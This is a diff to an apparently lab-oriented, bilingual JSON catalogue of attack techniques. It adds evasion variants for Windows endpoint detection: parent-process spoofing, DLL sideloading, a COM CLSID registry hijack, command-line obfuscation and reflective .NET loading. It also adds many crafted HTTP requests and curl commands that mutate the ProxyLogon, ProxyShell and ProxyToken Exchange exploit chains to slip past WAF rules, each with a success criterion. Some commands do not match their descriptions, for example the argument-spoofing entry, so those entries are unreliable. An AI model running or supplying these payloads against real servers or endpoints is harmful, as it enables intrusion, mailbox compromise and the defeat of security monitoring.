+            "zh": "无注入 API 组合规避变体",
+            "en": "Injection-Free API Combo Evasion Variant"
+          },
+          "command": "cmd /c start /b /min C:\\Windows\\System32\\notepad.exe && powershell -nop -c \"$p=Get-Process notepad | Select-Object -First 1; (Get-CimInstance Win32_Process -Filter \\\"ProcessId=$($p.Id)\\\").ParentProcessId\"",
+          "description": {
+            "zh": "绕过 PROC_THREAD_ATTRIBUTE 使用监控：用 shell start 指令组合自然形成目标父进程关系。成功判据：父子关系成立且无属性 API 调用。",
+            "en": "Evades monitoring of PROC_THREAD_ATTRIBUTE usage by naturally forming the target parentage through shell start composition. Success: the parent-child relation holds with no attribute API calls."
+          }
+        }
+      ]
     },
     {
       "id": "evasion-dll-sideloading",
@@ -8487,8 +10929,8 @@
         "en": "Endpoint Protection and Telemetry Integrity"
       },
       "subCategory": {
-        "zh": "DLL 侧加载搜索顺序检测",
-        "en": "DLL Sideloading Search-Order Detection"
+        "zh": "进程伪装与内存载荷规避",
+        "en": "Process Masquerading & In-memory Payload Evasion"
       },
       "prerequisites": [
         {
@@ -8592,7 +11034,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "当前目录优先规避变体",
+            "en": "Current-Directory Precedence Evasion Variant"
+          },
+          "command": "Copy-Item {LAB_PROXY_DLL} \"$PWD\\version.dll\"; .\\{LAB_APPLICATION_BINARY}",
+          "description": {
+            "zh": "绕过应用目录监控：DLL 置于当前目录利用搜索顺序优先加载。成功判据：代理 DLL 被应用加载执行。",
+            "en": "Evades application-directory monitoring by placing the DLL in the current directory to win the search order. Success: the proxy DLL loads and executes in the application."
+          }
+        },
+        {
+          "title": {
+            "zh": "清单局部化规避变体",
+            "en": "Manifest Localization Evasion Variant"
+          },
+          "command": "New-Item -ItemType Directory \"$PWD\\en-US\" -Force; Copy-Item {LAB_PROXY_DLL} \"$PWD\\en-US\\{LAB_APP_DLL}\"; .\\{LAB_APPLICATION_BINARY}",
+          "description": {
+            "zh": "绕过根目录 DLL 扫描：利用清单/SxS 的语言子目录搜索加载代理。成功判据：子目录 DLL 被加载。",
+            "en": "Evades root-directory DLL scanning by exploiting manifest/SxS language-subfolder probing. Success: the subfolder DLL loads."
+          }
+        },
+        {
+          "title": {
+            "zh": "COM CLSID 劫持规避变体",
+            "en": "COM CLSID Hijack Evasion Variant"
+          },
+          "command": "New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\" -Force; Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\" -Name '(Default)' -Value '{LAB_PROXY_DLL}'",
+          "description": {
+            "zh": "绕过文件系统级侧加载检测：经 HKCU CLSID 注册表劫持让系统加载指定 DLL。成功判据：触发 COM 激活时代理 DLL 加载。",
+            "en": "Evades filesystem-level sideload detection by hijacking an HKCU CLSID so the system loads the designated DLL on COM activation. Success: the proxy DLL loads when the COM class activates."
+          }
+        }
+      ]
     },
     {
       "id": "evasion-arg-spoofing",
@@ -8609,8 +11086,8 @@
         "en": "Endpoint Protection and Telemetry Integrity"
       },
       "subCategory": {
-        "zh": "进程参数多源遥测审计",
-        "en": "Process-Argument Multi-Source Telemetry Audit"
+        "zh": "进程伪装与内存载荷规避",
+        "en": "Process Masquerading & In-memory Payload Evasion"
       },
       "prerequisites": [
         {
@@ -8714,7 +11191,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "可变缓冲区覆写规避变体",
+            "en": "Mutable-Buffer Overwrite Evasion Variant"
+          },
+          "command": "$cmd='powershell -nop -w hidden -enc {LAB_BASE64_COMMAND}'; $p=[Win32.Kernel32]::CreateProcess('C:\\Windows\\System32\\cmd.exe','cmd /c dir',0,0,$false,0,0,0,[Win32.Kernel32+STARTUPINFO]::new(),[Win32.Kernel32+PROCESS_INFORMATION]::new())",
+          "description": {
+            "zh": "绕过命令行快照一致性校验：CreateProcess 后进程内覆写参数缓冲区，遥测读到的与执行的不同。成功判据：进程行为与记录命令行不匹配。",
+            "en": "Evades command-line snapshot consistency checks by overwriting the parameter buffer after CreateProcess so telemetry and execution diverge. Success: process behavior mismatches the recorded command line."
+          }
+        },
+        {
+          "title": {
+            "zh": "环境变量间接传递规避变体",
+            "en": "Env-Var Indirection Evasion Variant"
+          },
+          "command": "$env:EVIL_CMD='whoami'; Start-Process cmd -ArgumentList '/c %EVIL_CMD% > C:\\Windows\\Temp\\as.log'",
+          "description": {
+            "zh": "绕过命令行参数扫描：敏感命令藏于环境变量，进程参数仅见变量引用。成功判据：as.log 生成且命令行无明文命令。",
+            "en": "Evades command-line scanning by hiding the sensitive command in an environment variable so process args only show the reference. Success: as.log appears with no plaintext command in the args."
+          }
+        },
+        {
+          "title": {
+            "zh": "延迟展开变形规避变体",
+            "en": "Delayed-Expansion Mutation Evasion Variant"
+          },
+          "command": "cmd /v:on /c \"set X=who&& set Y=ami&& !X!!Y! > C:\\Windows\\Temp\\as2.log\"",
+          "description": {
+            "zh": "绕过参数全文匹配：延迟展开拼接命令词，快照中无完整命令。成功判据：as2.log 生成。",
+            "en": "Evades full-parameter matching via delayed expansion that assembles command words after the snapshot. Success: as2.log appears."
+          }
+        }
+      ]
     },
     {
       "id": "evasion-clr-injection",
@@ -8731,8 +11243,8 @@
         "en": "Endpoint Protection and Telemetry Integrity"
       },
       "subCategory": {
-        "zh": "CLR 程序集加载遥测审计",
-        "en": "CLR Assembly-Load Telemetry Audit"
+        "zh": "应用控制与 LOLBin 绕过",
+        "en": "Application Control & LOLBin Bypass"
       },
       "prerequisites": [
         {
@@ -8836,7 +11348,42 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "Unmanaged PowerShell 规避变体",
+            "en": "Unmanaged PowerShell Evasion Variant"
+          },
+          "command": "$asm=[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('{LAB_PS_HOST_DLL}')); $asm.GetType('Host').GetMethod('Run').Invoke($null,@())",
+          "description": {
+            "zh": "绕过 powershell.exe 宿主与模块日志：自托管 CLR 执行等效 PowerShell，无引擎日志。成功判据：动作完成且无 PowerShell 通道日志。",
+            "en": "Evades the powershell.exe host and module logging by self-hosting the CLR to run equivalent PowerShell without engine logs. Success: the action completes with no PowerShell channel logs."
+          }
+        },
+        {
+          "title": {
+            "zh": "反射方法直调规避变体",
+            "en": "Reflection Direct-Invoke Evasion Variant"
+          },
+          "command": "$a=[System.Reflection.Assembly]::LoadFile('{LAB_APPLICATION_BINARY}'); $a.EntryPoint.Invoke($null,@(,[string[]]@()))",
+          "description": {
+            "zh": "绕过 Process.Start 型命令执行检测：以反射直调入口点，无子进程生成。成功判据：入口执行且无新进程。",
+            "en": "Evades Process.Start-style execution detection by invoking the entry point via reflection with no child process. Success: the entry executes with no new process."
+          }
+        },
+        {
+          "title": {
+            "zh": "COMPlus 加载器变形规避变体",
+            "en": "COMPlus Loader Mutation Evasion Variant"
+          },
+          "command": "$env:COMPlus_EnableClassicHost='1'; [System.Runtime.Loader.AssemblyLoadContext]::Default.LoadFromAssemblyPath('{LAB_APPLICATION_BINARY}').EntryPoint.Invoke($null,@())",
+          "description": {
+            "zh": "绕过默认加载上下文的 ALC 审计：调整 CLR 加载器环境后按路径加载。成功判据：程序集执行且默认上下文无加载记录。",
+            "en": "Evades default-context ALC auditing by tuning the CLR loader environment then loading by path. Success: the assembly executes with no default-context load record."
+          }
+        }
+      ]
     },
     {
       "id": "proxylogon",
@@ -8958,7 +11505,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "X-AnonResource-Backend SSRF 链编码变形",
+            "en": "X-AnonResource-Backend SSRF chain encoding variants"
+          },
+          "command": "POST /owa/auth/x.js HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-AnonResource=true; X-AnonResource-Backend=127.0.0.1/ecp/default.flt%3F~3;\nX-ClientId={LAB_VALUE}\n\nPOST /owa/auth/x.js HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-AnonResource=true; X-AnonResource-Backend=localhost%2Fecp%2Fdefault.flt%3F~3;\nX-ClientId={LAB_VALUE}\n\nPOST /owa/auth/x.js HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-AnonResource=true; X-AnonResource-Backend=LocalHost/ecp/default.flt?%7E3;\nX-ClientId={LAB_VALUE}\n\nPOST /owa/auth/x.js HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3%23;\nX-ClientId={LAB_VALUE}",
+          "description": {
+            "zh": "绕过按 localhost/ecp/default.flt?~3 字面匹配 X-AnonResource-Backend 的 WAF 规则：将主机换成 127.0.0.1、对 / ? ~ # 分别做 %2F %3F %7E %23 单元编码并改大小写，Cookie 解码后 SSRF 链等价而签名不命中；成功判据：响应仍出现 X-FEServer/X-CalculatedBETarget 头或 FBA 行为与原链一致。",
+            "en": "Bypasses WAF rules matching the literal localhost/ecp/default.flt?~3 in X-AnonResource-Backend: swapping to 127.0.0.1 and unit-encoding / ? ~ # as %2F %3F %7E %23 with case variance keeps the decoded SSRF chain equivalent; success criterion: response still carries X-FEServer/X-CalculatedBETarget or identical FBA behavior."
+          }
+        },
+        {
+          "title": {
+            "zh": "X-BEResource 定界双重编码",
+            "en": "X-BEResource delimiter double-encoding"
+          },
+          "command": "GET /ecp/default.flt HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-BEResource=localhost%23~1;\n\nGET /ecp/default.flt HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-BEResource=localhost%2523~1;\n\nGET /ecp/default.flt HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-BEResource=LocalHost%23~3;\n\nGET /mapi/nspi/ HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-BEResource=localhost%23~1?MailboxId={LAB_ADMIN_EMAIL};",
+          "description": {
+            "zh": "绕过对 X-BEResource 中 %23~ 定界符（后端定位 + 端口）特征拦截：一次编码 %23、双重编码 %2523、主机大小写与 ~1/~3 端口变体在反代解码后仍指向后端邮箱服务器；成功判据：响应非 401/403 且出现后端服务器特征（X-BEVersion/X-DiagInfo），说明请求被转发到后端角色。",
+            "en": "Bypasses rules keyed on the %23~ delimiter in X-BEResource (backend host + port): single %23, double %2523, host case and ~1/~3 port variants still resolve to the backend mailbox server after proxy decoding; success criterion: a non-401/403 response with backend markers (X-BEVersion/X-DiagInfo) proves backend routing."
+          }
+        },
+        {
+          "title": {
+            "zh": "Legacy 前端路径变形探测",
+            "en": "Legacy front-end path variant probing"
+          },
+          "command": "curl -sk -o /dev/null -w \"%{http_code}\\n\" https://{EXCHANGE_HOST}/owa/auth/./x.js\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" https://{EXCHANGE_HOST}/owa//auth//x.js\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" https://{EXCHANGE_HOST}/OWA/auth/x.js\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/owa/auth/x.js%23\"\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/owa/auth/x.js;.js\"\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/owa/auth/x.js/\"",
+          "description": {
+            "zh": "绕过仅对 /owa/auth/x.js 精确匹配的拦截与封禁：点段、双斜杠、大小写、%23 截断、; 截断与尾斜杠在 Exchange 前端规范化后仍命中 FBA 匿名端点；成功判据：变形路径返回与原始 x.js 相同的 200 状态与 FBA 页面指纹。",
+            "en": "Bypasses blocks anchored to the exact /owa/auth/x.js: dot segments, double slashes, case, %23 or ; truncation and trailing slash still hit the FBA anonymous endpoint after front-end normalization; success criterion: variants return the same 200 and FBA page fingerprint as the original x.js."
+          }
+        },
+        {
+          "title": {
+            "zh": "方法与协议版本差异",
+            "en": "Method and HTTP version variance"
+          },
+          "command": "curl -sk --http1.0 -X POST -H \"Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;\" -H \"X-ClientId={LAB_VALUE}\" https://{EXCHANGE_HOST}/owa/auth/x.js -o /dev/null -w \"%{http_code}\\n\"\ncurl -sk -X GET \"https://{EXCHANGE_HOST}/owa/auth/x.js?{LAB_VALUE}=1\" -o /dev/null -w \"%{http_code}\\n\"\ncurl -sk -X OPTIONS https://{EXCHANGE_HOST}/owa/auth/x.js -o /dev/null -w \"%{http_code}\\n\"\ncurl -sk -H \"Transfer-Encoding: chunked\" -d \"\" -H \"Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;\" https://{EXCHANGE_HOST}/owa/auth/x.js -o /dev/null -w \"%{http_code}\\n\"",
+          "description": {
+            "zh": "绕过只对 GET/POST + HTTP/1.1 组合建模的 WAF 规则：HTTP/1.0、GET 带 Cookie、OPTIONS 与 chunked 传输在部分引擎走不同解析路径；成功判据：任一组合仍能携带 X-AnonResource-Backend 触发后端 SSRF 行为（响应头含 X-FEServer 或 FBA 特征）。",
+            "en": "Bypasses WAF rules modeling only GET/POST over HTTP/1.1: HTTP/1.0, GET with cookies, OPTIONS and chunked bodies take different parser paths in some engines; success criterion: any combination still carries X-AnonResource-Backend to trigger backend SSRF behavior (X-FEServer header or FBA signature)."
+          }
+        }
+      ]
     },
     {
       "id": "proxyshell",
@@ -9080,7 +11673,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "@ 定界符编码变形",
+            "en": "@ delimiter encoding variants"
+          },
+          "command": "GET /autodiscover/autodiscover.json%3F@{LAB_DOMAIN}/mapi/nspi/?&Email={LAB_ADMIN_EMAIL} HTTP/1.1\nHost: {EXCHANGE_HOST}\n\nGET /autodiscover/autodiscover.json?%40{LAB_DOMAIN}/mapi/nspi/?&Email={LAB_ADMIN_EMAIL} HTTP/1.1\nHost: {EXCHANGE_HOST}\n\nGET /autodiscover/autodiscover.json%3f%40{LAB_DOMAIN}/mapi/npsi/?&Email={LAB_ADMIN_EMAIL} HTTP/1.1\nHost: {EXCHANGE_HOST}\n\nGET /autodiscover/autodiscover.json%253f%40{LAB_DOMAIN}/mapi/nspi/?&Email={LAB_ADMIN_EMAIL} HTTP/1.1\nHost: {EXCHANGE_HOST}",
+          "description": {
+            "zh": "绕过对 autodiscover.json?@ 拼接特征（ProxyShell 标志）的规则：分别对 ? 和 @ 做 %3F %40 编码乃至双重编码 %253F，客户端证书豁免逻辑按 Email 前缀解析仍生效；成功判据：响应为 200/301 而非 401，且证书认证被跳过（无 WWW-Authenticate 提示）。",
+            "en": "Bypasses rules on the signature autodiscover.json?@ splice: encoding ? and @ as %3F %40 with double-encoding %253F keeps the client-cert exempt parsing by Email prefix intact; success criterion: a 200/301 instead of 401 with client-cert authentication skipped (no WWW-Authenticate challenge)."
+          }
+        },
+        {
+          "title": {
+            "zh": "路径大小写与段变形",
+            "en": "Path case and segment variants"
+          },
+          "command": "curl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/AutoDiscover/AutoDiscover.json?@{LAB_DOMAIN}/mapi/nspi/?&Email={LAB_ADMIN_EMAIL}\"\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/autodiscover/autodiscover.json?@{LAB_DOMAIN}/./mapi/nspi/?&Email={LAB_ADMIN_EMAIL}\"\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/autodiscover/autodiscover.json?@{LAB_DOMAIN}//mapi//nspi?&Email={LAB_ADMIN_EMAIL}\"\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/autodiscover/autodiscover.json?@{LAB_DOMAIN}/mapi/nspi/%2e&Email={LAB_ADMIN_EMAIL}\"",
+          "description": {
+            "zh": "绕过大小写敏感或按规范化前字面匹配的路径规则：目录大小写、点段插入、双斜杠与 %2e 变形在 Exchange 前端规范化后仍路由到 MAPI 后端；成功判据：状态码与原始请求一致（非 401），证明仍走了 ProxyShell 豁免链。",
+            "en": "Bypasses case-sensitive or pre-normalization literal path rules: directory case, dot segments, doubled slashes and %2e still route to the MAPI backend after front-end normalization; success criterion: status codes match the original request (not 401), proving the ProxyShell exempt chain still applied."
+          }
+        },
+        {
+          "title": {
+            "zh": "Email 参数污染与变名",
+            "en": "Email parameter pollution and renaming"
+          },
+          "command": "GET /autodiscover/autodiscover.json?@{LAB_DOMAIN}/mapi/nspi/?Email={LAB_ADMIN_EMAIL}&Email=autodiscover/autodiscover.json%3f@{LAB_DOMAIN} HTTP/1.1\nHost: {EXCHANGE_HOST}\n\nGET /autodiscover/autodiscover.json?@{LAB_DOMAIN}/mapi/nspi/?&email={LAB_ADMIN_EMAIL} HTTP/1.1\nHost: {EXCHANGE_HOST}\n\nGET /autodiscover/autodiscover.json?@{LAB_DOMAIN}/mapi/nspi/?&Email={LAB_ADMIN_EMAIL}&X-Pad={LAB_VALUE} HTTP/1.1\nHost: {EXCHANGE_HOST}",
+          "description": {
+            "zh": "绕过对 &Email= 参数特征匹配的规则：HPP 双 Email 取值、参数名小写 email、尾随无害参数 X-Pad 改变查询串形状而解析结果不变；成功判据：仍返回 200 且 Autodiscover/MAPI 响应内容与原请求一致。",
+            "en": "Bypasses rules matching the &Email= parameter signature: HPP double-Email values, lowercase email name and a trailing X-Pad parameter reshape the query without changing parsed results; success criterion: still 200 with Autodiscover/MAPI bodies identical to the original request."
+          }
+        },
+        {
+          "title": {
+            "zh": "MAPI 端点迁移变形",
+            "en": "MAPI endpoint migration variants"
+          },
+          "command": "curl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/autodiscover/autodiscover.json?@{LAB_DOMAIN}/mapi/emsmdb/?&Email={LAB_ADMIN_EMAIL}\"\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/autodiscover/autodiscover.json?@{LAB_DOMAIN}/EWS/Exchange.asmx?&Email={LAB_ADMIN_EMAIL}\"\ncurl -sk -X POST -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/autodiscover/autodiscover.json?@{LAB_DOMAIN}/mapi/emsmdb/\" -H \"X-RequestType: Authenticate\" -H \"X-ClientApplication: WebService\" -H \"Content-Length: 0\"",
+          "description": {
+            "zh": "绕过只盯 /mapi/nspi 特征的拦截：同一 autodiscover.json 豁免链可换接 /mapi/emsmdb（代理登录端点）或 /EWS，再以 POST + MAPI 头完成认证；成功判据：emsmdb Authenticate 返回 200 且带 X-ResponseId/MAPI 会话 Cookie（与 ProxyShell 链一致）。",
+            "en": "Bypasses blocks fixated on /mapi/nspi: the same autodiscover.json exemption chain attaches to /mapi/emsmdb (proxy logon endpoint) or /EWS, then completes auth via POST with MAPI headers; success criterion: emsmdb Authenticate returns 200 with X-ResponseId/MAPI session cookies as in the ProxyShell chain."
+          }
+        }
+      ]
     },
     {
       "id": "exchange-proxytoken",
@@ -9202,7 +11841,53 @@
           "added-blue-team-evidence-requirements",
           "added-version-and-evidence-boundaries"
         ]
-      }
+      },
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "X-ClientApplication 值与头名变形",
+            "en": "X-ClientApplication value and header-name variants"
+          },
+          "command": "GET /ews/Exchange.asmx HTTP/1.1\nHost: {EXCHANGE_HOST}\nX-ClientApplication: Outlook/16.0.6001.1081\nAuthorization: Negotiate {LAB_VALUE}\n\nGET /ews/Exchange.asmx HTTP/1.1\nHost: {EXCHANGE_HOST}\nx-clientapplication: Test\nAuthorization: Negotiate {LAB_VALUE}\n\nGET /ews/Exchange.asmx HTTP/1.1\nHost: {EXCHANGE_HOST}\nX-ClientApplication: Test/1.0; Outlook\nAuthorization: Negotiate {LAB_VALUE}",
+          "description": {
+            "zh": "绕过拦截 X-ClientApplication: Test 精确值的规则：ProxyToken 依赖 DelegatedAuth 对该头\"非空即信任\"，因此换成合法 Outlook UA 值、头名小写或复合值均触发同一信任分支；成功判据：请求未弹 Basic 认证（无 WWW-Authenticate: Basic）而直接进入 EWS 处理。",
+            "en": "Bypasses rules blocking the exact X-ClientApplication: Test value: DelegatedAuth trusts any non-empty value, so a legitimate Outlook UA string, lowercase header name or composite value hits the same trust branch; success criterion: no Basic challenge (no WWW-Authenticate: Basic) and the request proceeds into EWS handling."
+          }
+        },
+        {
+          "title": {
+            "zh": "EWS 路径规范化变形",
+            "en": "EWS path normalization variants"
+          },
+          "command": "curl -sk -o /dev/null -w \"%{http_code}\\n\" https://{EXCHANGE_HOST}/EWS/Exchange.asmx -H \"X-ClientApplication: Test\"\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" https://{EXCHANGE_HOST}/ews/Exchange.asmx/ -H \"X-ClientApplication: Test\"\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" https://{EXCHANGE_HOST}/ews/./Exchange.asmx -H \"X-ClientApplication: Test\"\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/ews/Exchange.asmx%23\" -H \"X-ClientApplication: Test\"\ncurl -sk -o /dev/null -w \"%{http_code}\\n\" \"https://{EXCHANGE_HOST}/ews/Exchange.asmx?La={LAB_VALUE}\" -H \"X-ClientApplication: Test\"",
+          "description": {
+            "zh": "绕过对 /ews/Exchange.asmx 精确路径的检测与速率限制：大小写、尾斜杠、点段、%23 截断与查询串追加在 EWS 前端规范化后命中同一终结点；成功判据：所有变形返回同原始路径一致的响应码与服务器头（含 X-DiagInfo 指纹）。",
+            "en": "Bypasses detection and rate limits on the exact /ews/Exchange.asmx path: case, trailing slash, dot segments, %23 truncation and appended query strings normalize to the same endpoint; success criterion: all variants return response codes and server headers (X-DiagInfo fingerprint) identical to the original path."
+          }
+        },
+        {
+          "title": {
+            "zh": "Authorization 值形态变形",
+            "en": "Authorization value shape variants"
+          },
+          "command": "GET /ews/Exchange.asmx HTTP/1.1\nHost: {EXCHANGE_HOST}\nX-ClientApplication: Test\nAuthorization: Negotiate\t{LAB_VALUE}\n\nGET /ews/Exchange.asmx HTTP/1.1\nHost: {EXCHANGE_HOST}\nX-ClientApplication: Test\nauthorization: Negotiate {LAB_VALUE}\n\nGET /ews/Exchange.asmx HTTP/1.1\nHost: {EXCHANGE_HOST}\nX-ClientApplication: Test\nAuthorization: NEGOTIATE {LAB_VALUE}\nAuthorization: Negotiate {LAB_VALUE}",
+          "description": {
+            "zh": "绕过对 \"Authorization: Negotiate <token>\" 固定模板的规则：scheme 与 token 间用制表符、头名小写、scheme 全大写及双 Authorization 头（取其一）等形态在 IIS/HttpListener 解析中等价；成功判据：变形请求仍以受害者身份通过 Negotiate 验证（响应含其邮箱上下文而非 401）。",
+            "en": "Bypasses rules on the fixed \"Authorization: Negotiate <token>\" template: a tab between scheme and token, lowercase header name, uppercase scheme and duplicate Authorization headers (one honored) parse equivalently in IIS/HttpListener; success criterion: the variant still authenticates as the victim (mailbox context in response, not 401)."
+          }
+        },
+        {
+          "title": {
+            "zh": "方法版本差异与 SOAP 内联",
+            "en": "Method/version variance with inline SOAP"
+          },
+          "command": "curl -sk --http1.0 -X POST https://{EXCHANGE_HOST}/ews/Exchange.asmx -H \"X-ClientApplication: Test\" -H \"Authorization: Negotiate {LAB_VALUE}\" -H \"Content-Type: text/xml; charset=utf-8\" --data-binary \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><ResolveNames xmlns=\\\"http://schemas.microsoft.com/exchange/services/2006/messages\\\" ReturnFullContactData=\\\"0\\\"><UnresolvedEntry>{LAB_USER}</UnresolvedEntry></ResolveNames></soap:Body></soap:Envelope>\" -o /dev/null -w \"%{http_code}\\n\"\ncurl -sk -X POST https://{EXCHANGE_HOST}/EWS/Exchange.asmx/ -H \"X-ClientApplication: Test\" -H \"Authorization: Negotiate {LAB_VALUE}\" -H \"Content-Type: application/soap+xml\" -d \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><GetFolder xmlns=\\\"http://schemas.microsoft.com/exchange/services/2006/messages\\\"/></soap:Body></soap:Envelope>\" -o /dev/null -w \"%{http_code}\\n\"",
+          "description": {
+            "zh": "绕过仅对 GET/HTTP1.1 或无体请求建模的防护：HTTP/1.0 + POST + 内联 SOAP（ResolveNames/GetFolder）携带 DelegatedAuth 头组合直达 EWS 数据面；成功判据：返回 200 且 SOAP 响应包含目标邮箱解析/文件夹结果，证明代理认证链未拦截。",
+            "en": "Bypasses defenses modeling only GET/HTTP1.1 or bodyless requests: HTTP/1.0 + POST + inline SOAP (ResolveNames/GetFolder) carries the DelegatedAuth header set straight to the EWS data plane; success criterion: 200 with SOAP results for the target mailbox, proving the proxy auth chain did not block it."
+          }
+        }
+      ]
     }
   ]
 }
